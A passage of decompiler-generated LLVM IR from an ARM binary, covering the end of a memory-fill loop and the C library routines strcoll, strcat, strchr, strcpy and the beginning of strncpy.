.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13e38.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_13e38.pre to i8
  br label %bb

dec_label_pc_13e44:                               ; preds = %.thread, %bb, %dec_label_pc_13e2c
  %v0_13e5028 = phi i32 [ %tmp, %dec_label_pc_13e2c ], [ %v6_13e38, %bb ], [ %v6_13e38, %.thread ]
  %v0_13e48.pr = phi i32 [ %v0_13e24, %dec_label_pc_13e2c ], [ %v0_13e48.pr.pre, %bb ], [ %v2_13e3c, %.thread ]
  %v0_13e44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13e44, i32* @ip, align 4
  %v8_13e4810 = icmp eq i32 %v0_13e48.pr, 8
  store i1 %v8_13e4810, i1* %cpsr_z.global-to-local, align 1
  %v5_13e4c11 = icmp slt i32 %v0_13e48.pr, 8
  br i1 %v5_13e4c11, label %dec_label_pc_13e88, label %dec_label_pc_13e50.preheader

dec_label_pc_13e50.preheader:                     ; preds = %dec_label_pc_13e44
  %v1_13e5046 = inttoptr i32 %v0_13e5028 to i32*
  store i32 %v0_13e44, i32* %v1_13e5046, align 4
  %v3_13e5047 = add i32 %v0_13e5028, 4
  %v4_13e5048 = inttoptr i32 %v3_13e5047 to i32*
  %v5_13e5049 = load i32, i32* @ip, align 4
  store i32 %v5_13e5049, i32* %v4_13e5048, align 4
  %v6_13e5050 = add i32 %v0_13e5028, 8
  store i32 %v6_13e5050, i32* %r3.global-to-local, align 4
  %v0_13e5451 = load i32, i32* @r2, align 4
  %v1_13e5452 = add i32 %v0_13e5451, -8
  store i32 %v1_13e5452, i32* %r2.global-to-local, align 4
  %v5_13e5c53 = icmp slt i32 %v1_13e5452, 8
  br i1 %v5_13e5c53, label %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e60

dec_label_pc_13e60:                               ; preds = %dec_label_pc_13e50.preheader, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge
  %v6_13e5055 = phi i32 [ %v6_13e50, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge ], [ %v6_13e5050, %dec_label_pc_13e50.preheader ]
  %v0_13e5054 = phi i32 [ %v12_13e7c, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge ], [ %v0_13e5028, %dec_label_pc_13e50.preheader ]
  %v1_13e60 = inttoptr i32 %v6_13e5055 to i32*
  %v2_13e60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13e60, i32* %v1_13e60, align 4
  %v3_13e60 = add i32 %v0_13e5054, 12
  %v4_13e60 = inttoptr i32 %v3_13e60 to i32*
  %v5_13e60 = load i32, i32* @ip, align 4
  store i32 %v5_13e60, i32* %v4_13e60, align 4
  %v6_13e60 = add i32 %v0_13e5054, 16
  store i32 %v6_13e60, i32* %r3.global-to-local, align 4
  %v0_13e64 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e64 = add i32 %v0_13e64, -8
  store i32 %v1_13e64, i32* %r2.global-to-local, align 4
  %v5_13e6c = icmp slt i32 %v1_13e64, 8
  br i1 %v5_13e6c, label %dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e60
  %v1_13e70 = inttoptr i32 %v6_13e60 to i32*
  %v2_13e70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13e70, i32* %v1_13e70, align 4
  %v3_13e70 = add i32 %v0_13e5054, 20
  %v4_13e70 = inttoptr i32 %v3_13e70 to i32*
  %v5_13e70 = load i32, i32* @ip, align 4
  store i32 %v5_13e70, i32* %v4_13e70, align 4
  %v6_13e70 = add i32 %v0_13e5054, 24
  store i32 %v6_13e70, i32* %r3.global-to-local, align 4
  %v0_13e74 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e74 = add i32 %v0_13e74, -8
  store i32 %v1_13e74, i32* %r2.global-to-local, align 4
  %v5_13e7c = icmp slt i32 %v1_13e74, 8
  br i1 %v5_13e7c, label %dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e70
  %v7_13e7c = inttoptr i32 %v6_13e70 to i32*
  %v8_13e7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_13e7c, i32* %v7_13e7c, align 4
  %v9_13e7c = add i32 %v0_13e5054, 28
  %v10_13e7c = inttoptr i32 %v9_13e7c to i32*
  %v11_13e7c = load i32, i32* @ip, align 4
  store i32 %v11_13e7c, i32* %v10_13e7c, align 4
  %v12_13e7c = add i32 %v0_13e5054, 32
  store i32 %v12_13e7c, i32* %r3.global-to-local, align 4
  %v6_13e80 = load i32, i32* %r2.global-to-local, align 4
  %v7_13e80 = add i32 %v6_13e80, -8
  store i32 %v7_13e80, i32* %r2.global-to-local, align 4
  %v5_13e4c = icmp slt i32 %v7_13e80, 8
  br i1 %v5_13e4c, label %dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge

dec_label_pc_13e48.dec_label_pc_13e50_crit_edge:  ; preds = %dec_label_pc_13e48
  %v2_13e50.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13e50 = inttoptr i32 %v12_13e7c to i32*
  store i32 %v2_13e50.pre, i32* %v1_13e50, align 4
  %v3_13e50 = add i32 %v0_13e5054, 36
  %v4_13e50 = inttoptr i32 %v3_13e50 to i32*
  %v5_13e50 = load i32, i32* @ip, align 4
  store i32 %v5_13e50, i32* %v4_13e50, align 4
  %v6_13e50 = add i32 %v0_13e5054, 40
  store i32 %v6_13e50, i32* %r3.global-to-local, align 4
  %v0_13e54 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e54 = add i32 %v0_13e54, -8
  store i32 %v1_13e54, i32* %r2.global-to-local, align 4
  %v5_13e5c = icmp slt i32 %v1_13e54, 8
  br i1 %v5_13e5c, label %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e60

dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge, %dec_label_pc_13e50.preheader
  %v1_13e54.lcssa = phi i32 [ %v1_13e5452, %dec_label_pc_13e50.preheader ], [ %v1_13e54, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e48
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e44, %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge, %dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge, %dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge, %dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge, %entry
  %v0_13e90 = phi i32 [ %v0_13e24, %entry ], [ %v1_13e74, %dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge ], [ %v1_13e64, %dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge ], [ %v7_13e80, %dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge ], [ %v1_13e54.lcssa, %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge ], [ %v0_13e48.pr, %dec_label_pc_13e44 ]
  %v2_13e88 = icmp eq i32 %v0_13e90, 0
  store i1 %v2_13e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e88, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13e88
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13e88
  %v1_13e90 = sub i32 7, %v0_13e90
  store i32 %v1_13e90, i32* %r2.global-to-local, align 4
  %v3_13e94 = mul i32 %v1_13e90, 4
  %v4_13e94 = add i32 %v3_13e94, ptrtoint (i32* @global_var_13e9c.1106 to i32)
  call void @__pseudo_branch(i32 %v4_13e94)
  %v0_13e9c = load i32, i32* %r1.global-to-local, align 4
  %v1_13e9c = trunc i32 %v0_13e9c to i8
  %v2_13e9c = load i32, i32* %r3.global-to-local, align 4
  %v3_13e9c = inttoptr i32 %v2_13e9c to i8*
  store i8 %v1_13e9c, i8* %v3_13e9c, align 1
  %v4_13e9c = load i32, i32* %r3.global-to-local, align 4
  %v5_13e9c = add i32 %v4_13e9c, 1
  store i32 %v5_13e9c, i32* %r3.global-to-local, align 4
  %v0_13ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ea0 = trunc i32 %v0_13ea0 to i8
  %v3_13ea0 = inttoptr i32 %v5_13e9c to i8*
  store i8 %v1_13ea0, i8* %v3_13ea0, align 1
  %v4_13ea0 = load i32, i32* %r3.global-to-local, align 4
  %v5_13ea0 = add i32 %v4_13ea0, 1
  store i32 %v5_13ea0, i32* %r3.global-to-local, align 4
  %v0_13ea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ea4 = trunc i32 %v0_13ea4 to i8
  %v3_13ea4 = inttoptr i32 %v5_13ea0 to i8*
  store i8 %v1_13ea4, i8* %v3_13ea4, align 1
  %v4_13ea4 = load i32, i32* %r3.global-to-local, align 4
  %v5_13ea4 = add i32 %v4_13ea4, 1
  store i32 %v5_13ea4, i32* %r3.global-to-local, align 4
  %v0_13ea8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ea8 = trunc i32 %v0_13ea8 to i8
  %v3_13ea8 = inttoptr i32 %v5_13ea4 to i8*
  store i8 %v1_13ea8, i8* %v3_13ea8, align 1
  %v4_13ea8 = load i32, i32* %r3.global-to-local, align 4
  %v5_13ea8 = add i32 %v4_13ea8, 1
  store i32 %v5_13ea8, i32* %r3.global-to-local, align 4
  %v0_13eac = load i32, i32* %r1.global-to-local, align 4
  %v1_13eac = trunc i32 %v0_13eac to i8
  %v3_13eac = inttoptr i32 %v5_13ea8 to i8*
  store i8 %v1_13eac, i8* %v3_13eac, align 1
  %v4_13eac = load i32, i32* %r3.global-to-local, align 4
  %v5_13eac = add i32 %v4_13eac, 1
  store i32 %v5_13eac, i32* %r3.global-to-local, align 4
  %v0_13eb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13eb0 = trunc i32 %v0_13eb0 to i8
  %v3_13eb0 = inttoptr i32 %v5_13eac to i8*
  store i8 %v1_13eb0, i8* %v3_13eb0, align 1
  %v4_13eb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_13eb0 = add i32 %v4_13eb0, 1
  store i32 %v5_13eb0, i32* %r3.global-to-local, align 4
  %v0_13eb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13eb4 = trunc i32 %v0_13eb4 to i8
  %v3_13eb4 = inttoptr i32 %v5_13eb0 to i8*
  store i8 %v1_13eb4, i8* %v3_13eb4, align 1
  %v4_13eb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_13eb4 = add i32 %v4_13eb4, 1
  store i32 %v5_13eb4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13e50, { 1, 0 }
  uselistorder i32 %v12_13e7c, { 1, 2, 0 }
  uselistorder i32 %v0_13e5054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13e48.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13e38, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_13e2c, { 1, 0 }
  uselistorder i32 %v0_13e24, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 5, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13e88, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13e60, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_13ec4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_13ec4 = phi i32 [ %v0_13ec4.pre, %bb ], [ %v5_13ec4, %bb3 ]
  %v0_13ec0 = phi i32 [ %tmp, %bb ], [ %v5_13ec0, %bb3 ]
  %v1_13ec0 = inttoptr i32 %v0_13ec0 to i8*
  %v2_13ec0 = load i8, i8* %v1_13ec0, align 1
  %v3_13ec0 = zext i8 %v2_13ec0 to i32
  store i32 %v3_13ec0, i32* @r2, align 4
  %v1_13ec4 = inttoptr i32 %v0_13ec4 to i8*
  %v2_13ec4 = load i8, i8* %v1_13ec4, align 1
  %v3_13ec4 = zext i8 %v2_13ec4 to i32
  %v2_13ec8 = icmp eq i8 %v2_13ec0, 0
  br i1 %v2_13ec8, label %.dec_label_pc_13ed4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_13ec4 = add i32 %v0_13ec4, 1
  %v5_13ec0 = add i32 %v0_13ec0, 1
  %v10_13ecc = icmp eq i8 %v2_13ec0, %v2_13ec4
  br i1 %v10_13ecc, label %entry, label %dec_label_pc_13ed4

.dec_label_pc_13ed4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13ed4

dec_label_pc_13ed4:                               ; preds = %bb3, %.dec_label_pc_13ed4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_13ed4_crit_edge ], [ %v3_13ec0, %bb3 ]
  %v2_13ed4.pre-phi = sub nsw i32 %.pn, %v3_13ec4
  ret i32 %v2_13ed4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_13ec0, { 1, 0 }
  uselistorder i32 %v0_13ec4, { 1, 0 }
  uselistorder label %dec_label_pc_13ed4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f44

dec_label_pc_13f44:                               ; preds = %dec_label_pc_13f44, %entry
  %v0_13f44 = phi i32 [ %v5_13f44, %dec_label_pc_13f44 ], [ %tmp, %entry ]
  %v1_13f44 = inttoptr i32 %v0_13f44 to i8*
  %v2_13f44 = load i8, i8* %v1_13f44, align 1
  %v5_13f44 = add i32 %v0_13f44, 1
  store i32 %v5_13f44, i32* %r2.global-to-local, align 4
  %v2_13f48 = icmp eq i8 %v2_13f44, 0
  store i1 %v2_13f48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f48, label %dec_label_pc_13f50, label %dec_label_pc_13f44

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13f44
  %v1_13f50 = add i32 %v0_13f44, -1
  store i32 %v1_13f50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f54

dec_label_pc_13f54:                               ; preds = %dec_label_pc_13f54, %dec_label_pc_13f50
  %v2_13f5c = phi i32 [ %v6_13f5c, %dec_label_pc_13f54 ], [ %v1_13f50, %dec_label_pc_13f50 ]
  %v0_13f54 = load i32, i32* @r1, align 4
  %v1_13f54 = inttoptr i32 %v0_13f54 to i8*
  %v2_13f54 = load i8, i8* %v1_13f54, align 1
  %v5_13f54 = add i32 %v0_13f54, 1
  store i32 %v5_13f54, i32* @r1, align 4
  %v2_13f58 = icmp eq i8 %v2_13f54, 0
  store i1 %v2_13f58, i1* %cpsr_z.global-to-local, align 1
  %v3_13f5c = add i32 %v2_13f5c, 1
  %v4_13f5c = inttoptr i32 %v3_13f5c to i8*
  store i8 %v2_13f54, i8* %v4_13f5c, align 1
  %v5_13f5c = load i32, i32* %r2.global-to-local, align 4
  %v6_13f5c = add i32 %v5_13f5c, 1
  store i32 %v6_13f5c, i32* %r2.global-to-local, align 4
  %v0_13f60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f60, label %dec_label_pc_13f64, label %dec_label_pc_13f54

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f54
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13f5c, { 1, 0 }
  uselistorder i32 %v5_13f44, { 1, 0 }
  uselistorder i32 %v0_13f44, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_13f68 = load i32, i32* @r5, align 4
  %v9_13f68 = load i32, i32* @r6, align 4
  %v1_13f6c = urem i32 %arg1, 256
  br label %dec_label_pc_13f8c

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f8c
  %v3_13f74 = load i8, i8* %.0, align 1
  %v4_13f74 = zext i8 %v3_13f74 to i32
  %v9_13f78 = icmp eq i32 %v4_13f74, %v1_13f6c
  br i1 %v9_13f78, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_13f74
  ret i32 %v1_13f8c

bb24:                                             ; preds = %dec_label_pc_13f74
  %v2_13f80 = icmp eq i8 %v3_13f74, 0
  %v2_13f84 = add i32 %v1_13f8c, 1
  %v3_13f84 = inttoptr i32 %v2_13f84 to i8*
  br i1 %v2_13f80, label %dec_label_pc_14060, label %dec_label_pc_13f8c

dec_label_pc_13f8c:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_13f84, %bb24 ]
  %v1_13f8c = ptrtoint i8* %.0 to i32
  %v2_13f8c = urem i32 %v1_13f8c, 4
  %v3_13f8c = icmp eq i32 %v2_13f8c, 0
  br i1 %v3_13f8c, label %dec_label_pc_13f94, label %dec_label_pc_13f74

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f8c
  %v4_13f94 = mul nuw nsw i32 %v1_13f6c, 256
  %v5_13f94 = or i32 %v4_13f94, %v1_13f6c
  %v4_13f9c = mul i32 %v5_13f94, 65536
  %v5_13f9c = or i32 %v4_13f9c, %v5_13f94
  br label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_14058, %dec_label_pc_13fe0, %dec_label_pc_13f94
  %v0_14004 = phi i32 [ %v1_13f8c, %dec_label_pc_13f94 ], [ %v4_13fa0, %dec_label_pc_13fe0 ], [ %v4_13fa0, %dec_label_pc_14058 ]
  %v1_13fa0 = inttoptr i32 %v0_14004 to i32*
  %v2_13fa0 = load i32, i32* %v1_13fa0, align 4
  %v4_13fa0 = add i32 %v0_14004, 4
  %v2_13fa8 = xor i32 %v2_13fa0, %v5_13f9c
  %v2_13fb4 = add i32 %v2_13fa0, 2130640639
  %v1_13fb8 = sub i32 -1, %v2_13fa0
  %v2_13fbc = xor i32 %v2_13fb4, %v1_13fb8
  %v2_13fc0 = add i32 %v2_13fa8, 2130640639
  %v1_13fc8 = sub i32 -1, %v2_13fa8
  %v2_13fcc = and i32 %v2_13fbc, -2130640640
  %v2_13fd0 = xor i32 %v2_13fc0, %v1_13fc8
  %v2_13fd4 = icmp eq i32 %v2_13fcc, 0
  %v2_13fd8 = and i32 %v2_13fd0, -2130640640
  store i32 %v2_13fd8, i32* @lr, align 4
  br i1 %v2_13fd4, label %dec_label_pc_13fe0, label %dec_label_pc_13fe8

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_13fa0
  %v2_13fe0 = icmp eq i32 %v2_13fd8, 0
  br i1 %v2_13fe0, label %dec_label_pc_13fa0, label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fa0, %dec_label_pc_13fe0
  %v2_13fe8 = inttoptr i32 %v0_14004 to i8*
  %v3_13fe8 = load i8, i8* %v2_13fe8, align 1
  %v4_13fe8 = zext i8 %v3_13fe8 to i32
  %v1_13ff0 = add i32 %v0_14004, 1
  %v1_13ff4 = add i32 %v0_14004, 2
  %v9_13ff8 = icmp eq i32 %v4_13fe8, %v1_13f6c
  %v1_13ffc = add i32 %v0_14004, 3
  store i32 %v1_13ffc, i32* @ip, align 4
  br i1 %v9_13ff8, label %dec_label_pc_14004, label %dec_label_pc_1400c

dec_label_pc_14004:                               ; preds = %dec_label_pc_13fe8
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v0_14004

dec_label_pc_1400c:                               ; preds = %dec_label_pc_13fe8
  %v2_1400c = icmp eq i8 %v3_13fe8, 0
  br i1 %v2_1400c, label %dec_label_pc_14060, label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %dec_label_pc_1400c
  %v2_14014 = inttoptr i32 %v1_13ff0 to i8*
  %v3_14014 = load i8, i8* %v2_14014, align 1
  %v4_14014 = zext i8 %v3_14014 to i32
  %v9_14018 = icmp eq i32 %v4_14014, %v1_13f6c
  br i1 %v9_14018, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14014
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v1_13ff0

bb26:                                             ; preds = %dec_label_pc_14014
  %v2_14020 = icmp eq i8 %v3_14014, 0
  br i1 %v2_14020, label %dec_label_pc_14060, label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %bb26
  %v2_14028 = inttoptr i32 %v1_13ff4 to i8*
  %v3_14028 = load i8, i8* %v2_14028, align 1
  %v4_14028 = zext i8 %v3_14028 to i32
  %v9_1402c = icmp eq i32 %v4_14028, %v1_13f6c
  br i1 %v9_1402c, label %dec_label_pc_14034, label %dec_label_pc_1403c

dec_label_pc_14034:                               ; preds = %dec_label_pc_14028
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v1_13ff4

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14028
  %v2_1403c = icmp eq i8 %v3_14028, 0
  br i1 %v2_1403c, label %dec_label_pc_14060, label %dec_label_pc_14044

dec_label_pc_14044:                               ; preds = %dec_label_pc_1403c
  %v2_14044 = inttoptr i32 %v1_13ffc to i8*
  %v3_14044 = load i8, i8* %v2_14044, align 1
  %v4_14044 = zext i8 %v3_14044 to i32
  %v9_14048 = icmp eq i32 %v4_14044, %v1_13f6c
  br i1 %v9_14048, label %dec_label_pc_14050, label %dec_label_pc_14058

dec_label_pc_14050:                               ; preds = %dec_label_pc_14044
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v1_13ffc

dec_label_pc_14058:                               ; preds = %dec_label_pc_14044
  %v2_14058 = icmp eq i8 %v3_14044, 0
  br i1 %v2_14058, label %dec_label_pc_14060, label %dec_label_pc_13fa0

dec_label_pc_14060:                               ; preds = %bb24, %dec_label_pc_14058, %dec_label_pc_1403c, %bb26, %dec_label_pc_1400c
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13fa0, { 1, 0 }
  uselistorder i32 %v2_13fa0, { 0, 2, 1 }
  uselistorder i32 %v0_14004, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13f94, { 1, 0 }
  uselistorder i32 %v1_13f8c, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_13f6c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_13f68, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_13f68, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_14060, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_13fe8, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_14070 = sub i32 %arg1, %tmp
  %v1_14074 = add i32 %v2_14070, -1
  store i32 %v1_14074, i32* %r2.global-to-local, align 4
  %v2_140784 = load i8, i8* %arg2, align 1
  %v5_140786 = add i32 %tmp, 1
  store i32 %v5_140786, i32* %r1.global-to-local, align 4
  %v2_1407c7 = icmp eq i8 %v2_140784, 0
  store i1 %v2_1407c7, i1* %cpsr_z.global-to-local, align 1
  %v5_140808 = inttoptr i32 %arg1 to i8*
  store i8 %v2_140784, i8* %v5_140808, align 1
  %v0_140849 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140849, label %dec_label_pc_14088, label %dec_label_pc_14078.dec_label_pc_14078_crit_edge

dec_label_pc_14078.dec_label_pc_14078_crit_edge:  ; preds = %entry, %dec_label_pc_14078.dec_label_pc_14078_crit_edge
  %v0_14078.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_14080.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14078 = inttoptr i32 %v0_14078.pre to i8*
  %v2_14078 = load i8, i8* %v1_14078, align 1
  %v5_14078 = add i32 %v0_14078.pre, 1
  store i32 %v5_14078, i32* %r1.global-to-local, align 4
  %v2_1407c = icmp eq i8 %v2_14078, 0
  store i1 %v2_1407c, i1* %cpsr_z.global-to-local, align 1
  %v4_14080 = add i32 %v5_14078, %v3_14080.pre
  %v5_14080 = inttoptr i32 %v4_14080 to i8*
  store i8 %v2_14078, i8* %v5_14080, align 1
  %v0_14084 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14084, label %dec_label_pc_14088, label %dec_label_pc_14078.dec_label_pc_14078_crit_edge

dec_label_pc_14088:                               ; preds = %dec_label_pc_14078.dec_label_pc_14078_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14078.dec_label_pc_14078_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_1408c = icmp eq i32 %arg2, 3
  store i1 %v7_1408c, i1* %cpsr_z.global-to-local, align 1
  %v1_14094 = add i32 %arg1, -1
  store i32 %v1_14094, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_14110, label %dec_label_pc_1409c

dec_label_pc_1409c:                               ; preds = %entry
  %v3_1409c = udiv i32 %arg2, 4
  store i32 %v3_1409c, i32* @lr, align 4
  %v0_140a0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %dec_label_pc_140ec, %dec_label_pc_1409c
  %v2_140a8 = phi i32 [ %v6_140e0, %dec_label_pc_140ec ], [ %v1_14094, %dec_label_pc_1409c ]
  %v0_140a0 = phi i32 [ %v1_140f0, %dec_label_pc_140ec ], [ %v0_140a0.pre, %dec_label_pc_1409c ]
  %v1_140a0 = inttoptr i32 %v0_140a0 to i8*
  %v2_140a0 = load i8, i8* %v1_140a0, align 1
  %v3_140a0 = zext i8 %v2_140a0 to i32
  store i32 %v3_140a0, i32* %r3.global-to-local, align 4
  %v2_140a4 = icmp eq i8 %v2_140a0, 0
  store i1 %v2_140a4, i1* %cpsr_z.global-to-local, align 1
  %v3_140a8 = add i32 %v2_140a8, 1
  %v4_140a8 = inttoptr i32 %v3_140a8 to i8*
  store i8 %v2_140a0, i8* %v4_140a8, align 1
  %v5_140a8 = load i32, i32* %ip.global-to-local, align 4
  %v6_140a8 = add i32 %v5_140a8, 1
  store i32 %v6_140a8, i32* %ip.global-to-local, align 4
  %v0_140ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140ac, label %dec_label_pc_140fc, label %dec_label_pc_140b0

dec_label_pc_140b0:                               ; preds = %dec_label_pc_140a0
  %v0_140b0 = load i32, i32* @r1, align 4
  %v1_140b0 = add i32 %v0_140b0, 1
  %v2_140b0 = inttoptr i32 %v1_140b0 to i8*
  %v3_140b0 = load i8, i8* %v2_140b0, align 1
  %v4_140b0 = zext i8 %v3_140b0 to i32
  store i32 %v4_140b0, i32* %r3.global-to-local, align 4
  %v2_140b4 = icmp eq i8 %v3_140b0, 0
  store i1 %v2_140b4, i1* %cpsr_z.global-to-local, align 1
  %v3_140b8 = add i32 %v5_140a8, 2
